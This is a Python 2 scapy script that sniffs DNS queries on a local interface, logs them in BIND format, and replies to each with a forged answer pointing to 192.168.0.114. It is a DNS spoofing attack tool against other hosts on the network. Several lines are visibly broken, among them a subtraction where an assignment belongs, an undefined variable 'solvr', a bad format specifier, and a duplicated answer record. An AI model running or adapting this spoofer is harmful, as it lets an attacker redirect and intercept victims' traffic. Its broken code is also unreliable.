from datetime import datetime
import logging
from scapy.all import *

interface="enp0s3"
logfile="bind.log"

def dns(pkt, qname='google.com'):
        print "DNS"

        ip = IP()
        udp = UDP()
        ip.src = pkt[IP].dst
        ip.dst = pkt[IP].src
        udp.sport = pkt[UDP].dport
        udp.dport = pkt[UDP].sport
	print udp.sport

        solve = '192.168.0.114'

        qd = pkt[UDP].payload
        dns = DNS(id = qd.id, qr=1, qdcount=1, ancount=1, nscount=1, rnode=0)
        dns.qd = qd[DNSQR]
        dns.an = DNSRR(rrname=qname, ttl=3600, rdlen=4, rdata=solve)
        dns.an = DNSRR(rrname=qname, ttl=3600, rdlen=4, rdata=solve)
        dns.ar = DNSRR(rrname-solve, ttl=3600, rdlen=4, rdata=solvr)

        print "%s => %S" % (ip.dst, udp.dport)

        send(ip/udp/dns)

def dns_parser(data):
  if data.haslayer(DNS) and data.haslayer(DNSQR):
    ip = data.getlayer(IP)
    udp = data.getlayer(UDP)
    dns = data.getlayer(DNS)
    dnsqr = data.getlayer(DNSQR)
    now = datetime.now()
    timestamp = str(now.strftime('%d-%b-%Y %H:%M:%S.%f'))
    query = dnsqr.sprintf("%qname% %qclass% %qtype%").replace("'","")+ " +"
    log = '%s client %s#%s: query: %s (%s)' % (timestamp[:-3], ip.src, udp.sport, \
          query, ip.dst)
    logging.info(log)

    dns(data)

if __name__ == '__main__':
 
  logging.basicConfig(filename=logfile, format='%(message)s', level=logging.INFO)
  console = logging.StreamHandler()
  logging.getLogger('').addHandler(console)

  try:
    sniff(filter="udp dst port 53", prn=dns_parser, store=0, iface=interface)
  except KeyboardInterrupt:
    exit(0)
